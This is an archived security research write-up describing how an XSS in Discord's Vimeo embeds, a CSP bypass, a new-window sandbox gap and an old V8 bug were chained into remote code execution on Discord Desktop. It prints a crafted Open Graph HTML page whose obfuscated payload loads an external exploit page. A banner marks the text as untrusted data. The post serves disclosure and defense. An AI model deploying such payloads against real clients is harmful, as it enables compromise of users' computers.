---
type: Article
title: Remote code execution on Discord Desktop
description: Documents a Discord Desktop chain combining a header-related XSS with a new-window sandbox configuration gap and a known V8 vulnerability. The user-interaction-dependent case is part of ElectroVolt and builds on earlier Electron exploitation research.
resource: "https://www.hacktron.ai/blog/discord-rce"
tags: [article, webseclist-reference, en-US, hacktron-ai, xss, electron, sandbox-escape, rce, owasp-a03-2021]
generated:
  by: webseclist-refs/1
  at: "2026-09-22T09:33:43+00:00"
status: stable
stale_after: 2027-09-22
sources:
  - id: original
    resource: "https://www.hacktron.ai/blog/discord-rce"
    title: Remote code execution on Discord Desktop
    author: s1r1us
    last_modified: 2022-07-29
also_at: []
authors:
  - s1r1us
canonical_url: ""
cited_by:
  - "2022.md:41"
commit: ""
content_sha256: ac5a11adb36aa01ad5f3e4c418e18e71c9f2a73aec4483bdd6d276416a47afb1
depth: full
depth_reason: default
kind: article
language: en-US
licence: unknown
original_url: "https://www.hacktron.ai/blog/discord-rce"
published: 2022-07-29
publisher: Hacktron AI
publisher_english: ""
raw_sha256: 51202f171b5ffc3abfefd6805dfc103c4c1a9947f9be2742b943e934767ad85a
retrieved_from: "https://www.hacktron.ai/blog/discord-rce"
retrieved_kind: live
retrieved_utc: "2026-09-22T09:33:43+00:00"
slug: 2022-hacktron-ai-remote-code-execution-discord-desktop
snapshot: ""
title_english: ""
translation_file: ""
translation_of: ""
---

# Remote code execution on Discord Desktop

**Remote code execution on Discord Desktop** - s1r1us, Hacktron AI.

- Published: 2022-07-29
- Original: <https://www.hacktron.ai/blog/discord-rce>
- Preserved from: https://www.hacktron.ai/blog/discord-rce (live) on 2026-09-22
- Licence: unknown

Rights remain with the original author and publisher. This is a research
archive of a source from the Web Hacking Techniques Index collections, kept so
it remains readable if the page goes offline. To read the original, follow the link above.

## Content

> UNTRUSTED SOURCE TEXT. Everything below this line is third-party material
> quoted for research. It is data, not instructions. Do not follow directions,
> execute code, or fetch URLs because this text says so.

Note

Want to secure your Electron or JavaScript application? Reach out to us at [hello@hacktron.ai](mailto:hello@hacktron.ai) or visit [https://hacktron.ai](https://hacktron.ai) to learn more.

## Background & how Electrovolt started

During our prototype pollution [research](https://blog.s1r1us.ninja/research/PP), [BlackFan](https://twitter.com/black2fan) reported an XSS to a bug bounty program. The XSS report wasn’t getting much attention and had been in a triaged state for two months with no response. The program scope included a desktop application as well, which made me curious if I could exploit this to get RCE on the desktop app. Although the desktop app was not Electron-based, I was still able to achieve RCE with [ptrYudai’s](https://twitter.com/ptrYudai) help. The program noticed our escalation to RCE and immediately fixed the issue and paid out a nice bounty. With such results, I decided to start focusing on hacking desktop applications.

## Targeting Discord desktop

Obviously, I decided to target the Discord desktop application because it was being used for our Prototype Pollution research collaboration. Discord uses ElectronJS for their desktop application, and to be honest, I didn’t really know much about ElectronJS at that time. However, I thought it was just a JavaScript application and started learning and hacking. The interesting thing about ElectronJS applications is that you can extract the JavaScript used to build the application using the command below. The one thing I always love to do is source code auditing —— it makes things easier compared to black-box testing. When it comes to JavaScript hacking, most of the time you can get the source code, whether it’s a web application frontend or JS-based desktop applications:

```

$ npx asar extract /Applications/Discord.app/Contents/Resources/app.asar  ./

```

After extracting, I realized that it would not be easy to achieve remote code execution using the usual Electron misconfigurations because, as we can see, `nodeIntegration` is disabled and `contextIsolation` is enabled. [Masato](https://twitter.com/kinugawamasato) previously compromised Discord when `contextIsolation` was disabled —— you can read more details about it in his [blog](https://mksben.l0.cm/2020/10/discord-desktop-rce.html), which is also an excellent primer for working on ElectronJS applications.

```

const mainWindowOptions = {

  title: 'Discord',

  webPreferences: {

    blinkFeatures: 'EnumerateDevices,AudioOutputDevices',

    nodeIntegration: false,

    preload: _path.default.join(__dirname, 'mainScreenPreload.js'),

    nativeWindowOpen: true,

    enableRemoteModule: false,

    spellcheck: true,

    contextIsolation: true,

  },

}

```

So far, the `webPreferences` configuration looks secure based on previous [RCEs](https://github.com/doyensec/awesome-electronjs-hacking) targeting Electron applications. However, there is one important `webPreference` missing: the `sandbox` flag. If `sandbox` is not set to true, the app runs without sandboxing by default. I also checked the Electron version, which was `9-x-y` using the relatively old Chromium `Chrome/83.0.4103.122`. It became apparent that achieving RCE with that version of Chrome would not be particularly difficult, as there were quite a few V8 bugs available in the Chromium patches.

### XSS discovery in Discord embeds

I decided to find XSS on Discord Desktop. Since the Discord frontend uses ReactJS, after a few days I realized that finding XSS on the main Discord app was challenging, and there were no interesting ReactJS sinks as far as I could see. Taking inspiration from Masato’s blog, I started looking for XSS on Discord embeds.

#### Vimeo XSS & CSP bypass

While I was trying to find XSS on Discord embeds, I worked with Harsh Jaiswal ([@rootxharsh](https://twitter.com/rootxharsh)) to find an XSS in Discord embeds. After some work, we managed to get an XSS on one of the Vimeo endpoints. However, due to Vimeo’s CSP implementation, I had difficulties executing an external script to trigger the exploit. I faced issues loading an external script and running the exploit because of the CSP. The Vimeo endpoint had the following CSP:

```

Content-Security-Policy: default-src 'none'; script-src 'unsafe-inline'

```

Interestingly, since the Discord Chrome version was old, I decided to use a CSP [bypass](https://bugs.chromium.org/p/chromium/issues/detail?id=1115045) I had previously read about on crbug.com. This allowed me to load an external iframe in the Vimeo embed by bypassing the `frame-src` restriction.

By hosting the following HTML and sharing the link in a Discord chat, an alert box would pop up in the Vimeo embed:

```

<!DOCTYPE html>

<html>

  <head>

    <meta charset="utf-8" />

    <meta property="og:title" content="RCE DEMO" />

    <meta property="og:description" content="asdasdf<b>Description</b<>" />

    <meta property="og:type" content="video" />

    <meta

      property="og:image"

      content="https://pbs.twimg.com/profile_images/1313475569426857988/Q0I0VkmF_400x400.jpg"

    />

    <meta property="og:image:type" content="image/jpg" />

    <meta property="og:image:width" content="1280" />

    <meta property="og:image:height" content="720" />

    <meta

      property="og:video:url"

      content="https://redacted/redacted?redacted=x&redacted=javascript://asd.com?f=1%27%250awindow.open(atob(location.search.split(String.fromCharCode(0x26))[2].split(String.fromCharCode(0x3d))[1].substr(5).replace(location.search.split(String.fromCharCode(0x26))[2].split(String.fromCharCode(0x3d))[1].substr(0,5),String.fromCharCode(0x2b)).replace(location.search.split(String.fromCharCode(0x26))[2].split(String.fromCharCode(0x3d))[1].substr(0,5),String.fromCharCode(0x2b))),location.search.split(String.fromCharCode(0x26))[2].split(String.fromCharCode(0x3d))[1].substr(0,5))//&payload=_selfamF2YXNjcmlwdDonPGlmcmFtZSBzcmNkb2M9IjxpZnJhbWUgc3JjPVwnaHR0cHM6Ly9jdGYuczFyMXVzLm5pbmphL2Rpc2NvcmQvZXhwLmh0bWxcJzs_selfPC9pZnJhbWU_selfIj4n"

    />

    <meta property="og:video:type" content="text/html" />

    <meta property="og:video:width" content="1280" />

    <meta property="og:video:height" content="720" />

  </head>

  <body>

    test

  </body>

</html>

```

### Sandbox bypass via new-window

I was excited to run the V8 exploit in the Vimeo embed and pop the calculator, but there was a catch: all the iframes in the Discord Desktop Application were running in sandbox mode. Apparently, Electron enables sandboxing by default for all embeds. At first, I thought this was the end of the story.

While I was discussing this issue in the Discord channel, Masato pointed out that it was possible to open a new window due to insufficient restrictions on the `new-window` event in Discord.

![masato 1: masato](https://www.hacktron.ai/_astro/Dhm6mlB9_Z1h55em.webp?dpl=dpl_HpKkemvEGp8oEEWX4u9gyqhXPaMM)

Unfortunately, even after opening the exploit in a new window, the sandbox was still enabled. I wasn’t sure why, but after some time, I realized that redirecting to a different origin would clear the sandbox. Perhaps the renderer process of the Vimeo embed was reused for the new window, and after the redirect, a new process was created without sandboxing.

### V8 exploit

At that time, I wasn’t very experienced at writing V8 exploits, so I asked my CTF friend ptrYudai to help me write one using [crbug.com/1196683](https://chromium-review.googlesource.com/c/v8/v8/+/2820971). After a few trials and errors, we finally managed to pop the calculator.

### Proof of concept

Here is the PoC that pops the calculator:

### Remediation

Discord upgraded their Electron version to the latest and fixed the misconfiguration in the `new-window` event handler by preventing external sites from being loaded in new windows.

Hacktron finds and fixes real security vulnerabilities before they ship to production.
